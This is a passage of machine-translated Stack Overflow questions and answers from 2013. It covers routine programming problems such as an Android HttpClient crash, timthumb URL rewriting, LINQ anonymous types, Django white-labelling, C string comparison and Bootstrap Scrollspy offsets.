04-02 19:12:24.933: D/AndroidRuntime(331): Shutting down VM
04-02 19:12:24.933: W/dalvikvm(331): threadid=1: thread exiting with uncaught exception (group=0x40015560)
04-02 19:12:24.952: E/AndroidRuntime(331): FATAL EXCEPTION: main
04-02 19:12:24.952: E/AndroidRuntime(331): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.taseen.apps/com.taseen.apps.TestExternalDatabaseActivity}: java.lang.IllegalStateException: Target host must not be null, or set in parameters.
04-02 19:12:24.952: E/AndroidRuntime(331):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1647)
04-02 19:12:24.952: E/AndroidRuntime(331):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1663)
04-02 19:12:24.952: E/AndroidRuntime(331):  at android.app.ActivityThread.access$1500(ActivityThread.java:117)
04-02 19:12:24.952: E/AndroidRuntime(331):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:931)
04-02 19:12:24.952: E/AndroidRuntime(331):  at android.os.Handler.dispatchMessage(Handler.java:99)
04-02 19:12:24.952: E/AndroidRuntime(331):  at android.os.Looper.loop(Looper.java:123)
04-02 19:12:24.952: E/AndroidRuntime(331):  at android.app.ActivityThread.main(ActivityThread.java:3683)
04-02 19:12:24.952: E/AndroidRuntime(331):  at java.lang.reflect.Method.invokeNative(Native Method)
04-02 19:12:24.952: E/AndroidRuntime(331):  at java.lang.reflect.Method.invoke(Method.java:507)
04-02 19:12:24.952: E/AndroidRuntime(331):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
04-02 19:12:24.952: E/AndroidRuntime(331):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
04-02 19:12:24.952: E/AndroidRuntime(331):  at dalvik.system.NativeStart.main(Native Method)
04-02 19:12:24.952: E/AndroidRuntime(331): Caused by: java.lang.IllegalStateException: Target host must not be null, or set in parameters.
04-02 19:12:24.952: E/AndroidRuntime(331):  at org.apache.http.impl.client.DefaultRequestDirector.determineRoute(DefaultRequestDirector.java:572)
04-02 19:12:24.952: E/AndroidRuntime(331):  at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:292)
04-02 19:12:24.952: E/AndroidRuntime(331):  at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:555)
04-02 19:12:24.952: E/AndroidRuntime(331):  at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:487)
04-02 19:12:24.952: E/AndroidRuntime(331):  at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:465)
04-02 19:12:24.952: E/AndroidRuntime(331):  at com.taseen.apps.TestExternalDatabaseActivity.getData(TestExternalDatabaseActivity.java:51)
04-02 19:12:24.952: E/AndroidRuntime(331):  at com.taseen.apps.TestExternalDatabaseActivity.onCreate(TestExternalDatabaseActivity.java:36)
04-02 19:12:24.952: E/AndroidRuntime(331):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
04-02 19:12:24.952: E/AndroidRuntime(331):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1611)
04-02 19:12:24.952: E/AndroidRuntime(331):  ... 11 more 
```

# 获取所有客户.php

```
<?php

$con = mysql_connect("localhost", "root", "root")or die(mysql_error());

mysql_select_db("TestDatabase", $con) or die("can not connect to the database");
$result = mysql_query("SELECT * FROM customer")or die(mysql_error());

while($row = mysql_fetch_assoc($result))
{
    $output[] = $row;
}
  print(json_encode($output));

  mysql_close();

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:25:43.000

我认为您的问题是您忘记了`http://`前缀尝试以下代码：

```
HttpPost httppost = new  HttpPost("http://192.168.0.1/getAllCustomers.php"); 
```

请注意，您还需要设置 localhost 的实际服务器 ip instad。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:26:30.013

错误告诉你问题...

> java.lang.IllegalStateException：目标主机不能为空，或在参数中设置。

你确定你的意思是使用`127.0.0.2`？您是否有在该 IP 地址上运行的 PHP 服务器？

# wordpress - 带有 .htaccess 的 timthumb.php 友好 URL

> ID：15772536
> 
> 赞同：2
> 
> 时间：2013-04-02T19:20:03.233
> 
> 标签：wordpress, .htaccess, url-rewriting, friendly-url, timthumb

timthumb.php 是一个调整大小/裁剪 php 脚本，在数千个网站中使用，我在我的 wordpress 博客中使用它，我遇到了一个问题。

出于安全原因，我使用了一个插件来更改 wordpress 默认路径，例如：

### 例子

在
***mysite.com/wp-content/uploads/2013/03/example.jpg之前 在*** ***mysite.com/images/example.jpg***
之后

 **timthumb 根本无法识别新路径，似乎检索到 404 错误，找不到图像

我的问题：

![在此处输入图像描述](https://i.stack.imgur.com/vaTty.jpg)

如果您尝试直接访问 example.jpg 它可以正常工作，但使用 timthumb 它不会 ***mysite.com/images/example.jpg***
您可以看到图像，即使该文件实际上在
***mysite.com/wp-content/ uploads/2013/03/example.jpg***
但 timthumb 无法识别并输出上述错误

当前的 .htaccess

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteRule ^images/(.*) /wp-content/uploads/$1 [QSA,L]
RewriteRule ^lib/(.*) /wp-content/themes/mytheme/$1 [QSA,L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
RewriteRule ^/wp-content/themes/mytheme/$ lib/ [R,L]
RewriteRule ^/wp-content/uploads/$ images/ [R,L]
RewriteRule ^lib/$ /wp-content/themes/mytheme/ [L,NC]
RewriteRule ^images/$ /wp-content/uploads/ [L,NC]
</IfModule> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-13T18:25:43.353

timthumb 查找路径，您是否打开并查看过编辑 php？

更改目录后，我还必须自定义 timthumb ......我会寻找我的代码。

timthumb 在服务器端执行时拉取实际路径。

.htaccess 用于通过网络浏览器从外部提取图像。

您的文件实际上位于 /public_html/wp-content/uploads/yr/mo/xxxx.xxx

所以脚本试图解码一个不存在的位置。

您也许可以 ln（将图像文件夹软链接到上传文件夹服务器端）

这将允许脚本在不修改的情况下正常运行。**

# twitter-bootstrap - 英雄模板和流体模板之间的区别

> ID：15772538
> 
> 赞同：0
> 
> 时间：2013-04-02T19:20:07.497
> 
> 标签：twitter-bootstrap

我是 Bootstrap 的新手，我即将为我的项目选择一个模板，但我看不出两者之间的区别：

[http://twitter.github.com/bootstrap/examples/hero.html](http://twitter.github.com/bootstrap/examples/hero.html)

和流体版本：

[http://twitter.github.com/bootstrap/examples/fluid.html](http://twitter.github.com/bootstrap/examples/fluid.html)

我想要一个在桌面和移动浏览器中显示良好的模板，我已经在 iOS 设备上测试过它们，它们看起来都一样（当然，除了侧边栏）。

在我的拙见中，这两个示例都错过了对图像的调用，以更好地说明差异。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:26:00.750

流体会扩展到浏览器的整个宽度，而 hero.html 不会。流动性适用于应用程序，而英雄版本适用于宣传册网站。

# xcode - 如何拍摄 XCode 文本面板上的代码？

> ID：15772540
> 
> 赞同：-2
> 
> 时间：2013-04-02T19:20:14.823
> 
> 标签：xcode

如何拍摄 XCode 文本面板上的代码？

我想知道这一点，以便我可以上传需要帮助的代码图片。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:22:45.557

在 OSX 上：

*   Command+Shift+3：截取全屏（如果是多台显示器，则截取屏幕），并将其作为文件保存到桌面

*   Command+Shift+4：弹出一个选择框，您可以指定要截取屏幕截图的区域，然后将其作为文件保存到桌面

*   Command+Shift+4，然后空格键，然后单击窗口：仅截取窗口的屏幕截图并将其作为文件保存到桌面

来自[OSX 日报](http://osxdaily.com/2010/05/13/print-screen-mac/)

编辑：有关更多选项和文件格式的信息，请参阅MacRumors 的[本](http://guides.macrumors.com/Taking_Screenshots_in_Mac_OS_X)指南。

# c# - 如何将 LINQ 查询转换为匿名类型

> ID：15772544
> 
> 赞同：4
> 
> 时间：2013-04-02T19:20:41.143
> 
> 标签：c#, linq

我真是脑子有问题。我已经选择了我需要的元素和值，我只是在努力使它返回一个匿名类型：

这是 XML：

```
<r25:space xl:href="space.xml?space_id=244" id="BRJDMjQ0" crc="00000023" status="est">
  <r25:space_id>244</r25:space_id>
  <r25:space_name>BEC*103</r25:space_name>
  <r25:formal_name>Branson Education Center 103</r25:formal_name>
  <r25:partition_id />
  <r25:partition_name />
  <r25:favorite>F</r25:favorite>
  <r25:max_capacity>24</r25:max_capacity>
  <r25:fill_ratio />
  <r25:last_mod_user>kleierd</r25:last_mod_user>
  <r25:last_mod_dt>2009-11-19T15:35:33</r25:last_mod_dt>
</r25:space> 
```

我需要“space_id”和“space_name”的值，我可以用这个得到：

```
var ids = from id in xml.Descendants()
                  where id.Name.LocalName == "space_id" || id.Name.LocalName == "space_name"
                  select (string)id.Value; 
```

但我真的很喜欢这样：

```
var ids = from id in xml.Descendants()
                  where id.Name.LocalName == "space_id" || id.Name.LocalName == "space_name"
                  select new
                  { 
                      theId = //The id val would go here,
                      theName = //The name goes here
                  }; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:24:51.073

```
var ids = from id in xml.Descendants()
          where id.Name.LocalName == "space_id" || id.Name.LocalName == "space_name"
          select new
          { 
                theId = id.Value,
                theName = id.Name.LocalName
          }; 
```

ids 将保存值：

```
theId     theName 
244       pace_id 
BEC*103   space_name 
```

这将选择相同的节点：

```
XNamespace r25 = "yourSchemaDefinition";

var ids = xml.Descendants(r25 + "space_id")
             .Union(xml.Descendants(r25 + "space_name"))
             .Select(id => new
                           { 
                              theId = id.Value,
                              theName = id.Name.LocalName
                           }); 
```

注意：我已将`r25`架构定义添加到您的 xml 根节点

# c# - `int` 和 `datetime` 的 SqlDataAdapter 参数大小

> ID：15772545
> 
> 赞同：0
> 
> 时间：2013-04-02T19:20:47.370
> 
> 标签：c#, sql-server, sqldataadapter

创建和添加参数时，大小和类型`SqlDataAdapter`应该是什么？有没有必要的理由？`Int``DateTime``size`

```
adapter = new SqlDataAdapter();
adapter.InsertCommand = new SqlCommand(
    "insert into MyTable (id, created, stuff) values (@id, @created, @stuff)",
    connection);
adapter.InsertCommand.Parameters.Add("@id", SqlDbType.Int, ?????, "id");
adapter.InsertCommand.Parameters.Add("@created", SqlDbType.DateTime, ????, "created");
adapter.InsertCommand.Parameters.Add("@stuff", SqlDbType.VarChar, 250, "stuff"); 
```

添加以回答有关数据来源的问题：（在帖子的原始部分，我将“description”重命名为“stuff”）

```
 public static DataSet dumpETEvents()
    {
        DataSet ret = new DataSet();
        SQLiteDataAdapter adapter = new SQLiteDataAdapter();
        adapter.SelectCommand = new SQLiteCommand(
            "select id, created, description from ETEvents",
            DbDatabase.connection);
        adapter.MissingSchemaAction = MissingSchemaAction.Add;
        adapter.AcceptChangesDuringFill = false;
        adapter.Fill(ret);
        return ret;
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:23:07.033

有一些[`Add`](http://msdn.microsoft.com/en-us/library/hyaybfa1.aspx)不需要大小的重载，所以这**并不**总是需要的。

对于整数和`DATETIME`字段，由于它们具有固定大小，因此不需要。

您还应该看看[`AddWithValue`](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlparametercollection.addwithvalue.aspx)：

> `AddWithValue`替换`SqlParameterCollection.Add`采用 a`String`和 an的方法`Object`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T21:04:10.990

大小无所谓！

“对于固定长度的数据类型，Size 的值被忽略。可以检索它以提供信息，并返回提供者在将参数值传输到服务器时使用的最大字节数。”

请参阅这篇文章：http: [//msdn.microsoft.com/en-us/library/system.data.common.dbparameter.size%28v=vs.100%29.aspx](http://msdn.microsoft.com/en-us/library/system.data.common.dbparameter.size%28v=vs.100%29.aspx)

# javascript - 使用 Javascript 填充 2 个具有相同数据的字段

> ID：15772564
> 
> 赞同：-1
> 
> 时间：2013-04-02T19:22:01.267
> 
> 标签：javascript

我有一个表单字段 x_amount，它根据从下拉列表中的选择填充了一个静态数字，出于某种原因，它以 x_ship_to_address 的形式出现。如果选择 1 或 2，x_amount 将填充 25 或 45。如果选择 3 或 4，用户在 payment_mount 中输入一个值，然后 x_amount 变为 payment_amount x 1.03。我想要，如果用户选择 1 或 2，则 payment_amount 和 x_amount 都填充 25 或 45。这是正在使用静态数字填充 x_amount 的 JS：

```
function SI_money(amount) {
    // makes sure that there is a 0 in the ones column when appropriate
    // and rounds for to account for poor Netscape behaviors 
    amount=(Math.round(amount*100))/100;
    return (amount==Math.floor(amount))?amount+'.00':((amount*10==Math.floor(amount*10))?amount+'0':amount);
}

function calcTotal(){
var total = document.getElementById('x_amount');
var amount = document.getElementById('payment_amount');
var payment = document.getElementById('x_ship_to_address');

if( payment.selectedIndex == 0)
    total.value = 'select Type of Payment from dropdown';
else if( payment.selectedIndex == 3 || payment.selectedIndex == 4 )
    total.value = SI_money(parseFloat(amount.value * 1.03));
else if( payment.selectedIndex == 1 )
    total.value && amount.value = SI_money(25.00);
else if( payment.selectedIndex == 2 )
    total.value = SI_money(45.00);
} 
```

我想我希望 calcTotal 的最后两个 if 类似于：

```
else if( payment.selectedIndex == 1 )
    total.value && amount.value = SI_money(25.00);
else if( payment.selectedIndex == 2 )
    total.value && amount.value = SI_money(45.00); 
```

但是添加 && 会抛出错误。我想我只是遗漏了一些关于语法的东西——我怎么说这两个字段都填充了正确的静态数字？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:26:52.873

`&&`并不意味着“做这个和那个”。您需要分别执行这些：

```
total.value && amount.value = SI_money(25.00); <-- wrong 
```

正确的：

```
total.value = SI_money(25.00);
amount.value = SI_money(25.00); 
```

此外，您确实需要阅读以下内容：[JavaScript 编程语言的代码约定](http://javascript.crockford.com/code.html)。您的代码中存在可疑的大括号缺失。

# python - 在python SQLAlchemy模型中，为什么有些属性初始化了两次？

> ID：15772571
> 
> 赞同：1
> 
> 时间：2013-04-02T19:22:26.377
> 
> 标签：python, sqlalchemy

在这段代码中：

```
class Page(Base):
  __tablename__ = 'page'
  id = Column(Integer, primary_key=True)
  name = Column(Text, unique=True)
  data = Column(Text)

  def __init__(self, name, data):
    self.name = name
    self.data = data 
```

这是金字塔框架（python框架）中的一个*模型*，稍后会被SQLAlchemy使用，*名称*和*数据*被初始化两次：

```
name = Column... # First assignments.
self.name = name # Second time assignments. 
```

它在金字塔的教程中，并且根据赋值运算符在python中不能重载的事实，“name = Column（...）”是否必要？还是我完全错了， name=Column(...) 有什么特殊含义？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:24:19.310

外部范围是为类的利益声明一个字段。内部作用域是将对象的字段初始化为特定值。

```
name = Column(...) 
```

正在描述类的成员之一`Page`（“`Page`由一个名为 ' `name`', ... 的字段组成，而

```
self.name = name 
```

正在将一个特定的实例初始化`Page`为一个特定的值。（“这`Page()`有一个名字`"framistan"`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:24:32.670

它们没有被初始化两次。每个的第一次出现是定义类属性（并将我做出的有根据的猜测分配给它作为描述符），第二次是将实际实例的属性初始化为给定值。

# vb.net - 继承 - 子类中的变量初始化

> ID：15772573
> 
> 赞同：0
> 
> 时间：2013-04-02T19:22:32.353
> 
> 标签：vb.net, design-patterns

根据我在大学所学的“最佳实践”类型课程，我倾向于尽可能地支持组合而不是继承。我正在查看应用程序中的一些代码，如下所示：

```
Public Class A
    Protected _Name As String
    Public Property Name() As String
        Get
            Return _Name
        End Get
        Set(ByVal value As String)
            _Name = value
        End Set
    End Property
End Class

Public Class B
    Inherits A
End Class

Public Class C
    Inherits B
End Class

Public Class D
    Inherits C

    Public Sub SomeMethod()
       'This isn't good
       Name = "Ian"
    End Sub

    Public Shared Sub Main()
        Dim d As New D
        d.SomeMethod()
    End Sub

End Class 
```

在上面的例子中： D 类正在使用 A 类中的公共属性。之前的开发人员在 D 类中的 name 的初始化上面写了“这不好”。我相信他写这个评论的原因是由于业务规则，而不是他在 D 类中分配了 a.Name 的值这一事实。但是，我想检查上面的代码是否有任何问题。a.Name 由所有子类共享。B、C 和 D 类包含许多重载方法，所以我相信在这种情况下继承是正确的设计选择。

我希望以前的开发人员留下更多的文档。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T10:16:38.673

如果不破坏父类型的预期行为，那么在派生类中为父属性赋值并没有什么不好（参见[Liskov 替换原则](http://en.wikipedia.org/wiki/Liskov_substitution_principle)）。您示例中的类型 D 仍然可以视为 A 类。如果更改 Name 属性不是 A 类的禁止行为（我相信不是，因为该属性有一个设置器），那么分配可能不是问题。

也许之前的开发人员在他的评论中解决的问题是直接从数据层而不是从业务层获取值？

# django - 给 Django 网站贴上白标签的常见做法是什么？

> ID：15772576
> 
> 赞同：5
> 
> 时间：2013-04-02T19:23:00.590
> 
> 标签：django, python-2.7, django-templates, django-urls, white-labelling

我有一个 Web 应用程序，我想允许为我们的客户贴上白标。我已经在 PHP/ZendFramework 中完成了这项工作，关闭主机名 ( [http://example.com](http://example.com) )，从数据库中提取 logo/colors/other 并使用这些设置呈现主布局。

我是 Python/Django1.5 的新手，想知道是否有人在他们的应用程序中实现了白标功能。你是怎么做到的？有没有普遍的做法？

我做了一些谷歌搜索，发现一个较旧的博客使用 url 前缀实现了白标签功能，但在渲染布局时我仍然遇到一些问题

[http://chase-seibert.github.com/blog/2011/08/05/django-white-label-styling-with-url-prefixes.html](http://chase-seibert.github.com/blog/2011/08/05/django-white-label-styling-with-url-prefixes.html)

任何帮助都会很棒！谢谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-05-07T21:39:41.167

我没有找到一个好的答案，所以我只是实现了我自己的解决方案。

我所做的是创建一个`Whitelabel`看起来像这样的模型：

```
class Whitelabel(models.Model):
    name = models.CharField(max_length=255, null=False)
    logo = models.CharField(max_length=255, null=True, blank=True)
    primary_domain = models.CharField(max_length=256, null=False) 
```

然后我创建了一个上下文处理器，`application_name/context_processors.py`用于检查当前主机域并查看它是否与任何记录`primary_domain`字段匹配。如果匹配，则返回 and 的值`name`并将`logo`它们分配给参数`SITE_NAME`and `SITE_LOGO`。如果未找到匹配项，请为`SITE_NAME`和分配默认值`SITE_LOGO`，这可能是您的默认应用程序名称。

```
def whitelabel_processor(request):
    current_domain = request.get_host() 
    whitelabel = Whitelabel.objects.filter(primary_domain=current_domain).order_by('id')

    if whitelabel.count() != 0:
        config = {
            'SITE_NAME': whitelabel[0].name, 
            'SITE_LOGO': whitelabel[0].logo, 
            'SITE_DOMAIN': whitelabel[0].primary_domain
            }
    else:
        config = {
            'SITE_NAME': 'MY SITE', 
            'SITE_LOGO': '/static/images/logo.png', 
            'SITE_DOMAIN': 'http://%s' % Site.objects.get_current().domain
            }

    return config 
```

然后我将上下文处理器添加到我的设置文件中`TEMPLATE_CONTEXT_PROCESSORS`

```
TEMPLATE_CONTEXT_PROCESSORS = (
    "django.contrib.auth.context_processors.auth",
    ...
    "context_processors.whitelabel_processor", 
```

)

这样我就可以在我的`base.html`模板中这样称呼它们

```
<body>
    <h1>{{SITE_NAME}}</h1>
    <img src="{{SITE_LOGO}}" />
</body> 
```

这是有关模板上下文处理器的更多文档。 [https://docs.djangoproject.com/en/dev/ref/templates/api/#writing-your-own-context-processors](https://docs.djangoproject.com/en/dev/ref/templates/api/#writing-your-own-context-processors)

# python - 从标准输入获取python中的退格键？

> ID：15772580
> 
> 赞同：0
> 
> 时间：2013-04-02T19:23:10.867
> 
> 标签：python, special-characters, stdin

如果我从标准输入获得了退格，我该如何检查？我应该将输入字符与什么进行比较？我无法理解所有关于特殊字符的不同代码的解释（它是一个字符吗？），所以我想，有人可以帮我做一些非常简单的解释。

我想做这样的事情：

```
character = some_function_that_gets_a_character_from_stdin()
if character == 'BACKSPACE': #This is the interesting part
    do_smth() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:53:06.743

退格在代码点 0008；删除在 007F。（请注意您发布的图片在文本中如何显示“7F”。那是删除字符。）

试试这个：

```
character = some_function_that_gets_a_character_from_stdin()
if character == '\x08' or character == '\x7f': 
  do_smth() 
```

参考：[http ://en.wikipedia.org/wiki/List_of_Unicode_characters](http://en.wikipedia.org/wiki/List_of_Unicode_characters)

# c# - oledb连接不上

> ID：15772582
> 
> 赞同：0
> 
> 时间：2013-04-02T19:23:32.603
> 
> 标签：c#, ms-access, oledb

想要连接到 App_Data 文件夹中的 .mdb 文件。

连接字符串：

```
"Provider=Microsoft.JET.OLEDB.4.0;data source=|App_Data|\\abcd.mdb" 
```

接收错误：

```
Not a valid file name. 
```

当适配器尝试填充数据集时。

尝试过前斜杠、反斜杠、波浪线，应有尽有。似乎没有任何效果。

请帮忙，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-02-25T12:03:57.810

我知道这有点太晚了，但是我遇到了与您在这里提出的问题相同的问题，这对我有用：

```
string con = String.Format(
        "Provider=Microsoft.ACE.OLEDB.12.0;Data Source={0};Persist Security Info=True;", 
         String.Format(
                @"{0}\{1}",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "abcd.accdb"
         )
); 
```

`@`使您可以使用类似的字符而`\`无需使用反斜杠。我总是`@`在输入文件路径时使用。虽然我可以想象在你的代码中硬编码文件路径可能不是最好的方法，但试试这个（[什么是 app.config？](https://stackoverflow.com/questions/1431742/what-is-app-config-for)）。

该行`Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)`解析为环境变量的值`%APPDATA%`。

另请注意，此解决方案适用于`accdb`文件，如果您想使用此解决方案，`mdb`您需要`Provider`将`Microsoft.JET.OLEDB.4.0`.

我希望这个答案对某人有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:34:24.817

我认为你应该使用它`|DataDirectory|`，而不是`|App_Data|`。后面是一个反斜杠。

# jquery - jQuery AJAX - 状态已取消

> ID：15772583
> 
> 赞同：0
> 
> 时间：2013-04-02T19:23:34.217
> 
> 标签：jquery, post

当我尝试在托管时执行此请求时，它被取消，但它可以在本地主机上运行，​​问题出在哪里？

```
$(".cover_image").click(function() {
            var imgid = $(this).attr('title');
            var dataString =
                '&imgid=' + imgid;
            $.ajax({
                type: "POST",
                url: baseUrl + "welcome/cover",
                async: true,
                data: dataString,
                success: function(msg) {

                    window.location.href = 'http://www.facebook.com/profile.php?preview_cover='+ msg;
                    //  $("#loading").css('visibility', 'hidden');

                },
                beforeSend: function () {
                    $("#loading").css('visibility', 'visible');
                }
            }).done(function () {
                    $("#loading").css('visibility', 'hidden');

                });
        }); 
```

# c - c中的字符串比较

> ID：15772584
> 
> 赞同：2
> 
> 时间：2013-04-02T19:23:35.020
> 
> 标签：c, string, char, microblaze

我正在为 fpga 上的 microblaze 编写 ac 程序，现在我想检查我是否收到了消息，但 strncmp 和 strcmp 不起作用，唯一有效的方法是：

```
 char*as=malloc(sizeof(int));

    as=p->payload;
            if (*(as)=='o') {//first letter o
    if (*(as+1)=='k') {//second letter 
```

但是一旦我处理更长的文本，这将很难，所以有什么好的方法吗？我以这种格式尝试了 strncmp ：

```
 if (strncmp(as,"ok",2)==0)      //didnt work even changing 0 to 1 it just doesnt detectct it 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-02T19:26:14.897

来自[http://www.cplusplus.com/reference/cstring/strncmp/](http://www.cplusplus.com/reference/cstring/strncmp/)：

```
int strncmp(const char * str1, const char * str2, size_t num); 
```

您是否可能忘记提供要比较的最大字符数**num ？**

函数**strncmp**使用它，但**strcmp**没有！如果比较整个字符串，后一个可能是您想要的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T19:36:38.043

检查“strncmp”的语法

```
int strncmp ( const char * str1, const char * str2, size_t num ); 
```

其中`str1`是要比较的 C 字符串，`str2`是要比较的 C 字符串， 是要比较`num`的最大字符数。

我认为引入第三个变量`num`，即您要比较的最大字符数将解决您的问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-02T20:57:05.490

尝试使用警告 ( `-Wall -Wextra`) 重新编译您的程序。

我的猜测是您忘记`strncmp`在源文件的开头包含定义，如下所示：

```
#include <string.h> 
```

因此，当警告将被激活时，您应该会看到出现以下消息：

```
warning: implicit declaration of function 'strncmp()' 
```

尝试在编译时始终激活警告，这非常有帮助。

# wcf - WCF 数据服务：ChangeInterceptor 未触发更新

> ID：15772585
> 
> 赞同：0
> 
> 时间：2013-04-02T19:23:36.287
> 
> 标签：wcf, wcf-data-services, odata

我有一个 WCF 数据服务 (OData)，它充当更大系统的数据存储库。我正在尝试根据对存储库中实体的操作来触发特定方法。

具体来说，如果有人更改了`Message`记录，我想挂接到管道中。我正在使用`ChangeInterceptors`这个。

他们为`Add`和工作`Delete`。但是，更新实体时不会触发任何内容。我担心`DbContext`无法解决实体已更改的事实，因为请求是无状态的。

这不会触发处理程序：

```
var whatever = from m in Messages
where m.MessageKey == 3
select m;

whatever.First().UpdatedDate = DateTime.Now;
this.SaveChanges(); 
```

有没有其他人遇到过这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T14:47:23.927

所以，我试图使用 AttachTo() 来处理我的记录被分离的事实。这完全不起作用，并导致运行时异常，如下所示：

> 此操作要求实体为实体类型，且至少有一个键属性。参数名称：实体

无论如何，只需使用更新方法，更改就会被拦截（并实际应用）

```
var whatever = (from m in Messages where m.MessageKey == 1
select m ).Single();

whatever.UpdatedDate = DateTime.Now;
this.UpdateObject(whatever);
this.SaveChanges(); 
```

# iphone - 在ios中写入文件时出现错误代码516

> ID：15772587
> 
> 赞同：1
> 
> 时间：2013-04-02T19:23:42.627
> 
> 标签：iphone, objective-c, ipad, file-io

在我的 iPad 中写入文件时出现此错误。但是相同的应用程序在模拟器中运行良好。我在这里附上代码。

```
 NSString *filepath = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:doc.contentStreamFileName];
                         NSFileManager *fMngr = [NSFileManager defaultManager];
                         if ([fMngr fileExistsAtPath:filepath]) {
                             NSLog(@"File already available");
                             CMISExtensionElement *elem = [doc.properties.extensions objectAtIndex:0];
                             NSString *description = [self crop:elem.description];
                             [self loadImage:doc.contentStreamFileName desc:description];
                         }
                         else{
                             [doc downloadContentToFile:filepath completionBlock:^(NSError *error){
                                 if (nil == error) {
                                     NSLog(@"successful");
                                 }
                                 else
                                 {
                                     UIAlertView* alert = [[UIAlertView alloc]initWithTitle:@"Error retriving content" message:[NSString stringWithFormat:@"Error code: %d",error.code] delegate:self cancelButtonTitle:@"Ok" otherButtonTitles:nil];
                                     [alert show];

                                 }
                             }progressBlock:^(unsigned long long bytesDownloaded, unsigned long long bytesTotal){
                                 if (bytesTotal == bytesDownloaded) {
                                     CMISExtensionElement *elem = [doc.properties.extensions objectAtIndex:0];
                                     NSString *description = [self crop:elem.description];
                                     [self loadImage:doc.contentStreamFileName desc:description];
                                 }
                             }];
                         } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T21:27:04.997

您是否考虑过写入应用程序文档目录？我认为您不应该写入应用程序包，而只能从中读取。

```
NSString *documentsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];
NSString *filePath = [documentsDir stringByAppendingPathComponent:doc.contentStreamFileName]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-03T00:32:22.137

您不应该尝试在应用程序的捆绑目录中写入。

如果文件由您的应用程序生成和使用，您可能应该使用 NSApplicationSupport 目录，如果您希望文件对用户可见，则应该使用 NSApplicationDocuments 目录。

它不是绝对必要的，但它的常见做法是在其中为您的文件创建一个子目录。你可以使用 NSFileManager 的 createDirectory... 方法。

# javascript - 浮动图像搞砸了 Bootstrap Scrollspy

> ID：15772588
> 
> 赞同：5
> 
> 时间：2013-04-02T19:23:48.000
> 
> 标签：javascript, jquery, twitter-bootstrap, css-float, scrollspy

我已经使用引导程序设置了一个页面。（[http://ethnoma.org/about.html](http://ethnoma.org/about.html)）我有一个附加的侧边栏导航（效果很好）。我也在这个导航上使用 bootstrap scrollspy，并且导航中的所有链接都在同一页面内（使用 ancors）。一切正常（即使添加了平滑滚动插件）。在将所有内容添加到页面（我将其放在`<head>`.

```
<script type="text/javascript">
// ScrollSpy
$(function () {
    $('[data-spy="scroll"]').each(function () {
        var $spy = $(this).scrollspy('refresh')
    });
});
</script> 
```

然后我的客户要求我将图像添加到页面。我这样做是使用引导标记和 css 类，如下所示：

```
<a class="pull-right pad5" href="#">
    <img class="media-object img-polaroid" src="assets/img/about-001.jpg" alt="Partnership"/>
</a> 
```

这使父“a”标签向右浮动（在这种情况下）并使 img 成为块元素。

问题是这些浮动图像使页面比原来更长。然而 Scrollspy 仍然在同一个地方切换活动链接。这会导致 scrollspy 激活页面下方比您当前位置更远的内容链接。

在计算 ancors 链接到的 ID 的位置时，我不知道如何强制 Scrollspy 考虑浮动图像。你们有谁知道我该如何解决这个问题。您可以在以下页面[http://ethnoma.org/about.html中查看问题的实际效果](http://ethnoma.org/about.html)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-12-04T04:00:07.310

我自己也遇到了这个问题，所以我想我会提供一些解释和可能的解决方案，以防其他人发现自己陷入这种困境。

首先，`scrollspy`工作正常。在计算页面上各种元素的偏移量时，图像尚未加载，因此它们的有效高度为`0`. 稍后，当图像加载时，浏览器会确定它们的原始尺寸，重新计算页面布局，然后用图像重新绘制页面。但是，`scrollspy`它完全不知道该页面已被重新绘制，因此它继续使用陈旧的偏移量。

